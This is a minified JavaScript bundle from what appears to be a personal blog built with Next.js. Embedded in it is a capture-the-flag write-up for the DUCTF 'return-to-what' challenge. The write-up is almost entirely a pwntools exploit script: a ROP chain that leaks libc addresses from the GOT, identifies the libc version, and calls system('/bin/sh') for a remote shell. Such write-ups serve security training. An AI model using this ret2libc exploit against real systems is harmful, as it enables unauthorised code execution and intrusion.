k={ref:A,onClick:function(e){j.props&&"function"===typeof j.props.onClick&&j.props.onClick(e),e.defaultPrevented||function(e,t,n,a,r,o,i,s){("A"!==e.currentTarget.nodeName||!function(e){var t=e.currentTarget.target;return t&&"_self"!==t||e.metaKey||e.ctrlKey||e.shiftKey||e.altKey||e.nativeEvent&&2===e.nativeEvent.which}(e)&&(0,c.isLocalURL)(n))&&(e.preventDefault(),null==i&&(i=a.indexOf("#")<0),t[r?"replace":"push"](n,a,{shallow:o,locale:s}).then((function(e){e&&i&&(window.scrollTo(0,0),document.body.focus())})))}(e,n,d,b,m,h,y,O)},onMouseEnter:function(e){(0,c.isLocalURL)(d)&&(j.props&&"function"===typeof j.props.onMouseEnter&&j.props.onMouseEnter(e),p(n,d,b,{priority:!0}))}};return(e.passHref||"a"===j.type&&!("href"in j.props))&&(k.href=(0,c.addBasePath)((0,c.addLocale)(b,"undefined"!==typeof O?O:n&&n.locale,n&&n.defaultLocale))),o.default.cloneElement(j,k)};t.default=u},e7F1:function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return d}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"return-to-what (DUCTF)",description:"DUCTF",date:"September 21, 2020"},u={meta:p};function d(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"return-to-what (DUCTF)"),Object(o.a)("h6",null,"September 21, 2020"),Object(o.a)("p",null,"Unknown libc version. Leaked multiple addresses of libc functions. Offsets between functions were used to identify the correct libc version, using libc.rip."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"from pwn import *\n\n# local\n#target = process('./return-to-what')\n#libc = ELF('/usr/lib/libc.so.6')\n\n# remote nc chal.duc.tf 30003\ntarget = remote('chal.duc.tf', 30003)\nlibc = ELF('libc-2.27.so') # identified using libc.rip\n\npop_rdi = 0x40122b\ngot_puts = 0x404018\ngot_gets = 0x404020\ngot_libc_start_main = 0x403ff0\nplt_puts = 0x401030\nret = 0x401016\nstart = 0x401060\n\npayload = b''\npayload += b'A'*56\npayload += p64(pop_rdi)\npayload += p64(got_puts) # leak addr\npayload += p64(plt_puts) # print address of puts in libc\npayload += p64(start) # restart\n\ntarget.recv() # Where would you like to return to?\ntarget.sendline(payload)\n\nlibc_puts = int.from_bytes((target.recvuntil(b'\\\\n')[:-1]), byteorder='little')\nprint('puts: ' + hex(libc_puts))\n\npayload = b''\npayload += b'A'*56\npayload += p64(pop_rdi)\npayload += p64(got_gets) # leak addr\npayload += p64(plt_puts) # print address of puts in libc\npayload += p64(start) # restart\n\ntarget.recv() # Where would you like to return to?\ntarget.sendline(payload)\n\nlibc_gets = int.from_bytes((target.recvuntil(b'\\\\n')[:-1]), byteorder='little')\nprint('gets: ' + hex(libc_gets))\n\npayload = b''\npayload += b'A'*56\npayload += p64(pop_rdi)\npayload += p64(got_libc_start_main) # leak addr\npayload += p64(plt_puts) # print address of puts in libc\npayload += p64(start) # restart\n\ntarget.recv() # Where would you like to return to?\ntarget.sendline(payload)\n\nstart = int.from_bytes((target.recvuntil(b'\\\\n')[:-1]), byteorder='little')\nprint('__libc_start_main: ' + hex(start))\n\n# Use https://libc.rip/ to identify libc version\n# libc.rip identified libc version as libc6_2.27-3ubuntu1_amd64\n\n\nlibc.address = libc_puts - libc.symbols['puts']\nprint('libc puts' + hex(libc.symbols['puts']))\n\nbin_sh = next(libc.search(b'/bin/sh'))\nlibc_system = libc.symbols['system']\n\npayload = b''\npayload += b'A' * 56\npayload += p64(pop_rdi)\npayload += p64(bin_sh)\npayload += p64(ret)\npayload += p64(libc_system)\n\ntarget.sendline(payload)\ntarget.interactive()\n")))))}d.isMDXComponent=!0},rePB:function(e,t,n){"use strict";function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}n.d(t,"a",(function(){return a}))},vNVm:function(e,t,n){"use strict";var a=n("J4zp"),r=n("TqRt");t.__esModule=!0,t.useIntersection=function(e){var t=e.rootMargin,n=e.disabled||!i,r=(0,o.useRef)(),l=(0,o.useState)(!1),p=a(l,2),u=p[0],d=p[1],b=(0,o.useCallback)((function(e){r.current&&(r.current(),r.current=void 0),n||u||e&&e.tagName&&(r.current=function(e,t,n){var a=function(e){var t=e.rootMargin||"",n=s.get(t);if(n)return n;var a=new Map,r=new IntersectionObserver((function(e){e.forEach((function(e){var t=a.get(e.target),n=e.isIntersecting||e.intersectionRatio>0;t&&n&&t(n)}))}),e);return s.set(t,n={id:t,observer:r,elements:a}),n}(n),r=a.id,o=a.observer,c=a.elements;return c.set(e,t),o.observe(e),function(){o.unobserve(e),0===c.size&&(o.disconnect(),s.delete(r))}}(e,(function(e){return e&&d(e)}),{rootMargin:t}))}),[n,t,u]);return(0,o.useEffect)((function(){i||u||(0,c.default)((function(){return d(!0)}))}),[u]),[b,u]};var o=n("q1tI"),c=r(n("0G5g")),i="undefined"!==typeof IntersectionObserver;var s=new Map},vRNQ:function(e,t,n){e.exports={container:"Home_container__1EcsU",intro:"Home_intro__kLSjQ",header1:"Home_header1__33MLV",header2:"Home_header2__2VAe0",link:"Home_link__mABeA"}}},[["BR8T",0,1,2]]]);